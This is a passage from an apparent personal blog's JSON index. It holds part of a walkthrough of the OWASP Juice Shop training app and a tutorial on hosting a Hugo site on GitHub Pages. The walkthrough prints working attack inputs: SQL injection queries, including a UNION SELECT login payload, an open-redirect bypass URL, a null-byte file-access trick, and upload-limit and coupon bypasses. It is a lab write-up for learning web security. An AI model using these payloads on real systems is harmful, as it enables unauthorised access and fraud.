there\u0026rsquo;s an option to upload. This accepts only .pdf and .zip files so I zip a file that is below 100kB and capture a legit request via Burp.\nI change the extension back to .pdf and also change application/pdf from zip to pdf as well and delete the contents. Then I right click and choose paste from file and select a pdf file that is over the 100kB limit but still below 200kB and send the request.\nUpload Type Category: Improper Input Validation\nUpload a file that has no .pdf or .zip extension.\nSimply capture the request in Burp and remove the extension from the filename=.\nXXE Data Access Unavailable on the Heroku environment.\n4 * Challenges Access Log Category: Sensitive Data Exposure\nGain access to any access log file of the server.\nWhen I was testing out a tool from Github called Sitadel(https://github.com/shenril/Sitadel) I came across the log files. Another easy way is to use the OWASP ZAP DirBuster plugin for this.\nGo to https://exampleapp.herokuapp.com/support/logs and download the access log here to complete the challenge.\nAllowlist Bypass Category: Unvalidated Redirects\nEnforce a redirect to a page you are not supposed to redirect to.\nOn the menu list theres an option that redirects to the Juice Shop Github page https://exampleapp.herokuapp.com/redirect?to=https://github.com/bkimminich/juice-shop. To bypass the allowlist and the 406 Error: Unrecognized target URL for redirect error I had to use the original redirect but craft it a bit differently so that it includes where I want to redirect to between the site we are on and the allowed redirect. Like so:\nhttps://exampleapp.herokuapp.com/redirect?to=http://kimminich.de?pwned=https://github.com/bkimminich/juice-shop\nCSP Bypass Unavailable on the Heroku environment.\nChristmas Special Category: Injection\nOrder the Christmas special offer of 2014.\nI already know that this is susceptible to SQL Injection but if I didn\u0026rsquo;t the category would have been a give away. So first I use Injection to get a list of all the products https://exampleapp.herokuapp.com/rest/products/search?q=%27))--. I found one Christmas related entry with an id of 10.\nid\t10 name\t\u0026#34;Christmas Super-Surprise-Box (2014 Edition)\u0026#34; description\t\u0026#34;Contains a random selection of 10 bottles (each 500ml) of our tastiest juices and an extra fan shirt for an unbeatable price!

Heading over to the Network tab to make a POST request to /api/BasketItems and added the following lines:\nin the header: Content-Type: application/json in the body: {\u0026quot;BasketId\u0026quot;: \u0026quot;\u0026lt;Your Basket ID\u0026gt;\u0026quot;, \u0026quot;ProductId\u0026quot;: 10, \u0026quot;quantity\u0026quot;: 1}\nReloading the page got a successful 200 code response and the Christmas product was visible in the basket and clicking Checkout completes this challenge.\nEaster Egg Category: Broken Access Control\nFind the hidden easter egg.\nI\u0026rsquo;ve already been across the /ftp directory before in my search of log files and noticed a file there named eastere.gg. Attempting to download this I was met with an error, 403 Error: Only .md and .pdf files are allowed!. So I had to bypass this by tricking it into thinking it was a .md file.\nhttps://exampleapp.herokuapp.com/ftp/eastere.gg%2500.md\nThe attack used: http://projects.webappsec.org/w/page/13246949/Null%20Byte%20Injection\nEphemeral Accountant Category: Injection\nLog in with the (non-existing) accountant acc0unt4nt@juice-sh.op without ever registering that user.\nCarefully read the hints as it is possible to fail this challenge and have to restart the Juice Shop. Luckily it also reminds us that the category is a give away as to how to do this challenge properly. I had to look up the solution to this challenge as it was a bit above my current knowledge.\n' UNION SELECT * FROM (SELECT 15 as 'id', '' as 'username', 'acc0unt4nt@juice-sh.op' as 'email', '12345' as 'password', 'accounting' as 'role', '123' as 'deluxeToken', '1.2.3.4' as 'lastLoginIp' , '/assets/public/images/uploads/default.svg' as 'profileImage', '' as 'totpSecret', 1 as 'isActive', '1999-08-16 14:14:41.644 +00:00' as 'createdAt', '1999-08-16 14:33:41.930 +00:00' as 'updatedAt', null as 'deletedAt')--\nLogging in with this syntax as the email and anything as the password gets me a temporary JWT Token and establishes the ephemeral user session.\nExpired Coupon Category: Improper Input Validation\nSuccessfully redeem an expired campaign coupon code.\nFor this I went back to the debugger tab to have a look at main-es2015.js and did a search for campaign.\nWMNSDY2019: { validOn: 1551999600000, discount: 75 }, This tells us when the coupon was valid if we convert it to a JavaScript date this tells us that its valid on March 8th 2019. I simply had to set my system to this date timedatectl set-time `2019-03-08` and submit the code WMNSDY2019 to complete this challenge.\n","date":"September 19, 2021","hero":"/posts/owasp-juice-shop-walkthrough/hero.png","permalink":"http://localhost:1313/posts/owasp-juice-shop-walkthrough/","summary":"Setup For this I visited https://elements.heroku.com/buttons/bkimminich/juice-shop and looked through the many options to get my own personal instance of Juice Shop setup.

This really is the fastest and simplest way to get setup, and its free!\nAfter I clicked deploy I had to give the app a name and wait for it to build.","tags":null,"title":"OWASP Juice Shop Walkthrough"},{"categories":null,"contents":"Create a Repository Firstly you\u0026rsquo;ll want to create a repository for this on Github to make changes easier to update with git commit and push rather than uploading files manually every time you make changes. As this will be a Github Page you will want to name the repo as \u0026lsquo;.github.io\u0026rsquo;. Yes the .io here is important so make sure you add that.\nClone this repository to your local machine and cd to it, I added mine under the users documents folder.\nCreate the Hugo Site You\u0026rsquo;ll want to get the basic Hugo site next by using the command:\nhugo new site ./ -f=yaml --force The -f=yaml makes your YAML configuration file while the --force command is optional and only forces Hugo to build the site if theres files already in the directory so its unnecessary if you just created the directory.\nPick a Theme This part is the most important and should take you the longest. Before you go having a look around the themes first take the time to think about what you are making this site for and maybe note down what the theme needs to have and what things you\u0026rsquo;d like it to have but aren\u0026rsquo;t as necessary.\nThen head over to https://themes.gohugo.io/ and have a look at the tags on the right side. Chances are you already have in mind the kind of site you want. I was after a Portfolio site so that tag was the obvious choice for me to begin at.\nWhen you\u0026rsquo;ve found the theme you want you will have to click download and this will bring you to the github page for that theme. From there you will need to use the command git submodule add https://the-github-link.git themes/theme-name. I chose Toha for my theme so my command looks like:\ngit submodule add https://github.com/hugo-toha/toha.git themes/toha Run the Site You will want to test that its all working now and be able to see what changes you make appear like on the site locally before you commit those changes publicly on Github. To do this you will need to run the following command:\nhugo server -t toha -w Note that you will have to change toha to whatever theme you chose if you chose a different one. Running this opens up port 1313 by default to host your site locally and can be reached by going to http://localhost:1313.\nConfigure the Site Before you get started on the personal stuff it\u0026rsquo;s time to configure the basics first. Remember that yaml file we had Hugo create at the start? It is config.yaml and it is located in the root directory of your repository. Open it up in your favorite text editor, I personally use Atom for this. You\u0026rsquo;ll want to replace the default content with this:\n#baseURL: https://hugo-toha.github.io languageCode: en-us title: \u0026#34;Crystal Mercier\u0026#34; theme: \u0026#34;toha\u0026#34; # Manage languages # For any more details, you can check the official documentation: https://gohugo.io/content-management/multilingual/ languages: en: languageName: English weight: 1 # Force a locale to be use, really useful to develop the application !

If you are using Toha theme make sure you change the title: and more configurable options can be found at https://toha-guides.netlify.app/posts/configuration/site-parameters/.\nAdd Data There should be a data folder in the root directory and inside this folder should be another called en for English. If one or both of these are missing then you\u0026rsquo;ll need to create them.\nSite First you\u0026rsquo;ll add site information by creating a file named site.yaml within the /data/en/ directory and add the following content:\n# Copyright Notice copyright: © 2020 Copyright. # Meta description for your site. This will help the search engines to find your site. description: Portfolio and personal blog of Crystal Mercier. Change the description to whatever you want yours to be.\nAuthor Next create an author.yaml file within the /data/en/ directory and add the following in it:\n# some information about you name: \u0026#34;Crystal Mercier\u0026#34; nickname: \u0026#34;Crystal\u0026#34; # greeting message before your name. it will default to \u0026#34;Hi!

Set enable to true and change the information if you wish to use this section.\nDeploy site In the root directory run the command hugo, this builds the site and adds the contents to the folder public. Move into this folder and use the following commands:\ngit init git add . git remote add origin https://github.com/username/username.github.io.git git commit -m \u0026#34;first commit\u0026#34; git push origin master The git push step will ask for your username and password. Note that Github passwords do not seem to work for this anymore and the password is really asking for your Github personal access token. If you do not have a Github personal access token set you must do that now. When this successfully completes your new site will be up and running at https://\u0026lt;your username\u0026gt;.github.io.\nPersonal Access Token Open Github and go to settings on the menu that appears when you click your icon. From there click on Developer settings and the Personal access token section. Click Generate new token and give it a descriptive name and expiration date then give it the permissions you require and click Generate token.\nUse this token as the password and your push request will complete.\nAdd Posts To start adding new posts to your site you have to go to themes/toha/content and posts, if posts directory does not exist already you must create it then cd posts. Now create a file named _index.md within themes/toha/content/posts and add the following:\n--- title: Posts --- Next create a directory for your first post and cd into this new directory. Now create a file named index.md, this is a Markdown file and follows the Markdown syntax. Here is a quick cheat sheet for reference https://www.markdownguide.org/cheat-sheet/. Enter the following to the index.md file to get started:\n--- title: \u0026#34;How to build your own Hugo Website and host it for free on Github Pages\u0026#34; date: 2021-09-12 description: \u0026#34;I walk through the steps required to get a website up and running fast and easy using Hugo and Github Pages\u0026#34; menu: sidebar: name: Build your own Hugo website identifier: Build your own Hugo website weight: 1 --- Change the information to match your own post and begin writing your post below those --- lines.
